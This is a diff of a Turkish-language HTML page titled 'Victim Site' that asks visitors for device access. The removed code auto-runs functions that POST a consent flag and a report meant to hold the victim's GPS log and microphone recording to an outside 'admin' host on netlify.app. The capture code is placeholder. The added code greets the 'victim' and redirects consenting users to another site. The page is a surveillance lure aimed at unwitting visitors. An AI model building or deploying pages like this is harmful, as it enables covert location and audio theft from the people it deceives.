@@ -1,80 +1,19 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Kurban Sitesi</title>
 </head>
 <body>
-    <h1>Kurban Sitesi</h1>
-    <p>Bu site, cihazınıza erişim izni isteyecek.</p>
+    <h2>Merhaba, kurban!</h2>
+    <p>Cihazına erişim izni istiyoruz. Onaylamak için aşağıdaki düğmeye basın:</p>
+    <button onclick="izinVer()">İzin Ver</button>
 
-    <!-- JavaScript kodu -->
     <script>
-        // Kurban izin verdiğinde işlevleri çağır
-        function kurbanIzinVerdi() {
-            izinVerildi();
-            ozellikRaporu();
-        }
-
-        // Kurban izin verdiğinde işlevleri çağır
-        kurbanIzinVerdi();
-        
-        // Kurbanın cihazından izin alındığında admin sitesine bilgi gönder
-        function izinVerildi() {
-            // Admin sitesine POST isteği yap
-            fetch('https://hdfilmcehenemicom.netlify.app/izin', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    izin: true
-                })
-            })
-            .then(response => {
-                // Yanıtı kontrol et
-                if (response.ok) {
-                    console.log('Admin sitesine izin başarıyla bildirildi.');
-                } else {
-                    console.error('Admin sitesine izin bildirirken bir hata oluştu.');
-                }
-            })
-            .catch(error => {
-                console.error('Admin sitesine izin bildirirken bir hata oluştu:', error);
-            });
-        }
-
-        // Özellikleri raporla
-        function ozellikRaporu() {
-            // Özellikleri al
-            let gpsGünlüğü = 'GPS Günlüğü: ...'; // GPS günlüğünü almak için gereken kodu buraya ekle
-            let mikrofonKaydı = 'Mikrofon Kaydı: ...'; // Mikrofon kaydını almak için gereken kodu buraya ekle
-            // Diğer özellikleri benzer şekilde ekle...
-
-            // Admin sitesine özellik raporu gönder
-            fetch('https://hdfilmcehenemicom.netlify.app/rapor', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    gpsGünlüğü: gpsGünlüğü,
-                    mikrofonKaydı: mikrofonKaydı
-                    // Diğer özellikleri benzer şekilde ekle...
-                })
-            })
-            .then(response => {
-                // Yanıtı kontrol et
-                if (response.ok) {
-                    console.log('Admin sitesine özellik raporu başarıyla gönderildi.');
-                } else {
-                    console.error('Admin sitesine özellik raporu gönderirken bir hata oluştu.');
-                }
-            })
-            .catch(error => {
-                console.error('Admin sitesine özellik raporu gönderirken bir hata oluştu:', error);
-            });
+        function izinVer() {
+            // Burada cihaz erişim izni verme işlemi yapılacak.
+            // Örneğin: JavaScript ile cihazın yerel depolama veya kamera erişim izni alınabilir.
+            // Kurban izin verdiğinde, diğer siteye yönlendirilecek.
+            window.location.href = "http://site2.com/?izin=onaylandi";
         }
     </script>
 </body>
